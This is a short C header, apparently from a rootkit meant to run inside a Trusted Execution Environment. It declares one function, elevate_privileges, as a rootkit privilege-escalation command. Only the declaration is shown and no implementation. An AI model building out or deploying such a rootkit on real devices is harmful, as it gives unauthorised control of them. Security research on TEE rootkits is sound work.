#ifndef ROOTKIT_COMMANDS_PRIVILEGE_ESCALATION_H
#define ROOTKIT_COMMANDS_PRIVILEGE_ESCALATION_H

#include <tee_api.h>

TEE_Result elevate_privileges(uint32_t param_types, TEE_Param params[TEE_NUM_PARAMS]);

#endif
